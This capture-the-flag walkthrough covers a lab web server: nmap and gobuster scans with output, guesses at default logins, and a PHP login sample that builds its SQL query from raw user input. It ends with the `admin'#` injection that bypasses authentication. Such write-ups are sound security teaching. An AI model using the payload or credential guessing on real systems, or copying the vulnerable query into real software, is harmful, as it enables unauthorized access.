# Explosion

- TL;DR: SQL Injection vulenrability in a web application hosted on a apache web server running on port 80.

## Reconnaissance 

- Run an nmap scan:
```
nmap -sC -sV 10.129.58.234     

Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 05:00 PDT
Nmap scan report for 10.129.58.234
Host is up (0.081s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Login
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.76 seconds
```

<br>

## Exploitation

- We find the following port(s) open:
    - `80/tcp` Apache httpd 2.4.38
- We can view the web application in the browser by visiting `10.129.58.234:80`
- We can use the following command to brute force and check for additional directories:
    ```
    gobuster dir --url http://10.129.58.234:80 --wordlist /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
    ===============================================================
    Gobuster v3.5
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.129.58.234:80
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.5
    [+] Timeout:                 10s
    ===============================================================
    2023/07/05 05:19:53 Starting gobuster in directory enumeration mode
    ===============================================================
    /images               (Status: 301) [Size: 315] [--> http://10.129.58.234/images/]
    /css                  (Status: 301) [Size: 312] [--> http://10.129.58.234/css/]
    /js                   (Status: 301) [Size: 311] [--> http://10.129.58.234/js/]
    /vendor               (Status: 301) [Size: 315] [--> http://10.129.58.234/vendor/]
    /fonts                (Status: 301) [Size: 314] [--> http://10.129.58.234/fonts/]
    Progress: 87654 / 87665 (99.99%)
    ===============================================================
    2023/07/05 05:32:49 Finished
    ===============================================================
    
    ```
- We do not find any intresting directories from the above command.
- Next we try common combinations to login:
    ```
    admin:admin
    guest:guest
    user:user
    root:root
    administrator:password
    ```
- None of the above combinations work. We could attempt brute-forcing the login page but that could take time and trigger some security alerts.
- The following code is an example for how authentication works using PHP & SQL:
```
<?php

mysql_connect("localhost", "db_username", "db_password"); 
# Connection to the SQL Database.

mysql_select_db("users"); 
# Database table where user information is stored.

$username=$_POST['username']; # User-specified username.
$password=$_POST['password']; #User-specified password.

$sql="SELECT * FROM users WHERE username='$username' AND password='$password'";
# Query for user/pass retrieval from the DB.

$result=mysql_query($sql);
# Performs query stored in $sql and stores it in $result.

$count=mysql_num_rows($result);
# Sets the $count variable to the number of rows stored in $result.

if ($count==1){
    # Checks if there's at least 1 result, and if yes:
    $_SESSION['username'] = $username; # Creates a session with the specified $username.
    $_SESSION['password'] = $password; # Creates a session with the specified $password.
    header("location:home.php"); # Redirect to homepage.
}

else { # If there's no singular result of a user/pass combination:
    header("location:login.php");
    # No redirection, as the login failed in the case the $count variable is not equal to 1, HTTP Response code 200 OK.
}
?>
```
- From the above code we know that a successfull session is only created for the specified username and password if the query sent to the the DB returns one or more rows.
- Since there is no input validation, we can enter a query in the username field. For example `admin'#`.
- This will return a record(row) if it exists and will create a successful login session for the specified `username`. 
- We can provide any password because of an SQL injection vulnerabliity in the `username` field. The `admin'#` query comments everything after the `#` in the following query: `SELECT * FROM users WHERE username='admin'#' AND password='$password'`.
- Once we hit the login button with `admin'#:abc1234` we get the flag.